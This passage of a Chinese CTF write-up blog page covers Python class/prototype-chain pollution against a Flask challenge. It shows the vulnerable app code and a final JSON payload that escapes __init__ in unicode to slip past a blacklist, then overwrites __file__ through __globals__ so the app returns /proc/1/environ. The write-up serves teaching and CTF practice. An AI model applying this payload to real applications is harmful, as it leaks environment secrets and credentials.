class="title">Failed</span>&quot; </span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">@<span class="title">app</span>.<span class="title">route</span>(&#x27;/<span class="title">login</span>&#x27;,<span class="title">methods</span>=[&#x27;<span class="title">POST</span>&#x27;]) </span></span><br><span class="line"><span class="class"><span class="title">def</span> <span class="title">login</span>(): </span></span><br><span class="line"><span class="class">    <span class="title">if</span> <span class="title">request</span>.<span class="title">data</span>: </span></span><br><span class="line"><span class="class">        <span class="title">try</span>: </span></span><br><span class="line"><span class="class">            <span class="title">print</span>(<span class="title">request</span>.<span class="title">data</span>)</span></span><br><span class="line"><span class="class">            <span class="title">print</span>(<span class="title">json</span>.<span class="title">loads</span>(<span class="title">request</span>.<span class="title">data</span>))</span></span><br><span class="line"><span class="class">            <span class="title">data</span> = <span class="title">json</span>.<span class="title">loads</span>(<span class="title">request</span>.<span class="title">data</span>).<span class="title">encode</span>()</span></span><br><span class="line"><span class="class">            <span class="title">if</span> &quot;<span class="title">username</span>&quot; <span class="title">not</span> <span class="title">in</span> <span class="title">data</span> <span class="title">or</span> &quot;<span class="title">password</span>&quot; <span class="title">not</span> <span class="title">in</span> <span class="title">data</span>: </span></span><br><span class="line"><span class="class">                <span class="title">return</span> &quot;<span class="title">Login</span> <span class="title">Failed</span>&quot; </span></span><br><span class="line"><span class="class">            <span class="title">for</span> <span class="title">user</span> <span class="title">in</span> <span class="title">Users</span>: </span></span><br><span class="line"><span class="class">                <span class="title">if</span> <span class="title">user</span>.<span class="title">check</span>(<span class="title">data</span>): </span></span><br><span class="line"><span class="class">                    <span class="title">session</span>[&quot;<span class="title">username</span>&quot;] = <span class="title">data</span>[&quot;<span class="title">username</span>&quot;] </span></span><br><span class="line"><span class="class">                    <span class="title">return</span> &quot;<span class="title">Login</span> <span class="title">Success</span>&quot; </span></span><br><span class="line"><span class="class">        <span class="title">except</span> <span class="title">Exception</span>: </span></span><br><span class="line"><span class="class">            <span class="title">return</span> &quot;<span class="title">Login</span> <span class="title">Failed</span>&quot; </span></span><br><span class="line"><span class="class">        <span class="title">return</span> &quot;<span class="title">Login</span> <span class="title">Failed</span>&quot; </span></span><br><span class="line"><span class="class">        </span></span><br><span class="line"><span class="class">@<span class="title">app</span>.<span class="title">route</span>(&#x27;/&#x27;,<span class="title">methods</span>=[&#x27;<span class="title">GET</span>&#x27;]) </span></span><br><span class="line"><span class="class"><span class="title">def</span> <span class="title">index</span>(): </span></span><br><span class="line"><span class="class">    <span class="title">return</span> <span class="title">open</span>(<span class="title">__file__</span>, &quot;<span class="title">r</span>&quot;).<span class="title">read</span>() </span></span><br><span class="line"><span class="class">    #接收参数并打开当前文件并读取其内容，然后将整个文件的内容作为响应返回给客户端。</span></span><br><span class="line"><span class="class"><span class="title">if</span> <span class="title">__name__</span> == &quot;<span class="title">__main__</span>&quot;: </span></span><br><span class="line"><span class="class">    <span class="title">app</span>.<span class="title">run</span>(<span class="title">host</span>=&quot;0.0.0.0&quot;, <span class="title">port</span>=5010)</span></span><br></pre></td></tr></table></figure>
+
+<p>看到merge函数首先想到原型链污染，在index函数中是可以直接读取__file__对应的文件，因此想到利用merge函数去修改这个变量，将其变为我想看到的文件，可以看到register是创建了User对象，将data中的数值merge，那么就要在data中写上payload，在User类中重写了__init__类，同时__file__变量是一个全局值，就可以用上面写到的__globals__函数来获取全局变量并进行修改，最后再重新进入index中读取文件内容，因此最终payload为</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">data = <span class="punctuation">&#123;</span></span><br><span class="line">	<span class="attr">&quot;username&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;admin&quot;</span><span class="punctuation">,</span> </span><br><span class="line">	<span class="attr">&quot;password&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;123456&quot;</span><span class="punctuation">,</span> # 在data中定义username和password保证data可以进入merge函数中</span><br><span class="line">	<span class="attr">&quot;\u005F\u005F\u0069\u006E\u0069\u0074\u005F\u005F&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> # 在check中可以看到有black_list<span class="punctuation">,</span>__init__被过滤了，使用unioncode进行绕过</span><br><span class="line">		<span class="attr">&quot;__globals__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">			<span class="attr">&quot;__file__&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../../proc/1/environ&quot;</span> # 大部分的flag都隐藏在环境变量中</span><br><span class="line">		<span class="punctuation">&#125;</span></span><br><span class="line">	<span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">H0me</a></li>
+        
+          <li><a href="/about/">A6out</a></li>
+        
+          <li><a href="/tags/">T6gs</a></li>
+        
+          <li><a href="/categories/">Catagory</a></li>
+        
+          <li><a href="/links/">L1nks</a></li>
+        
+          <li><a href="/search/">s4arch</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01%E5%BA%9F%E8%AF%9D"><span class="toc-number">1.</span> <span class="toc-text">0x01废话</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02%E6%AD%A3%E6%96%87"><span class="toc-number">2.</span> <span class="toc-text">0x02正文</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">2.1.</span> <span class="toc-text">什么是原型链污染?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E5%8E%9F%E5%9E%8B%E9%93%BE"><span class="toc-number">2.2.</span> <span class="toc-text">关于原型链?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="toc-number">2.3.</span> <span class="toc-text">攻击原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B1%BB%E5%92%8C%E5%AE%9E%E4%BE%8B"><span class="toc-number">2.4.</span> <span class="toc-text">类和实例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B1%A1%E6%9F%93%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.5.</span> <span class="toc-text">污染条件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hasattr-%E5%87%BD%E6%95%B0"><span class="toc-number">2.5.1.</span> <span class="toc-text">hasattr()函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B1%A1%E6%9F%93%E8%BF%87%E7%A8%8B"><span class="toc-number">2.6.</span> <span class="toc-text">污染过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF"><span class="toc-number">2.7.</span> <span class="toc-text">绕过姿势</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%A7%BF%E5%8A%BF"><span class="toc-number">2.8.</span> <span class="toc-text">攻击姿势</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%95%E9%A2%98%E9%A2%98%E7%9B%AE"><span class="toc-number">2.9.</span> <span class="toc-text">试题题目</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GeekChallenge2023-ezpython"><span class="toc-number">2.9.1.</span> <span class="toc-text">[GeekChallenge2023]ezpython</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DSACTF2023%E4%B8%83%E6%9C%88%E6%9A%91%E6%9C%9F%E8%B5%9B%E2%80%93EzFlask"><span class="toc-number">2.9.2.</span> <span class="toc-text">DSACTF2023七月暑期赛–EzFlask</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/04/30/pyhton%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/04/30/pyhton%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/&text=python原型链污染"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/04/30/pyhton%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/&title=python原型链污染"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/04/30/pyhton%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/&is_video=false&description=python原型链污染"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=python原型链污染&body=Check out this article: https://wanth3f1ag.top/2025/04/30/pyhton%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/04/30/pyhton%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/&title=python原型链污染"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/04/30/pyhton%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/&title=python原型链污染"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/04/30/pyhton%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/&title=python原型链污染"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/04/30/pyhton%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/&title=python原型链污染"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/04/30/pyhton%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/&name=python原型链污染&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/04/30/pyhton%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/&t=python原型链污染"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        
+<footer id="footer">
+    <div class="footer-left">
+        Copyright ©
+        
+        
+        2024-2025
+        wanTh3flag
+        <br>
+    </div>
+    
+    <div class="footer-right">
+        <nav>
+            <ul>
+                <!--
+                --><li><a href="/">H0me</a></li><!--
+                --><!--
+                --><li><a href="/about/">A6out</a></li><!--
+                --><!--
+                --><li><a href="/tags/">T6gs</a></li><!--
+                --><!--
+                --><li><a href="/categories/">Catagory</a></li><!--
+                --><!--
+                --><li><a href="/links/">L1nks</a></li><!--
+                --><!--
+                --><li><a href="/search/">s4arch</a></li><!--
+                -->
+            </ul>
+            <ul>
+                
+                <!-- 不蒜子统计 -->
+                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+                <span class="post-meta-divider">|</span>
+                <span id="busuanzi_container_site_uv" style='display:none'>本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+                
+            </ul>
+        </nav>
+    </div>
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
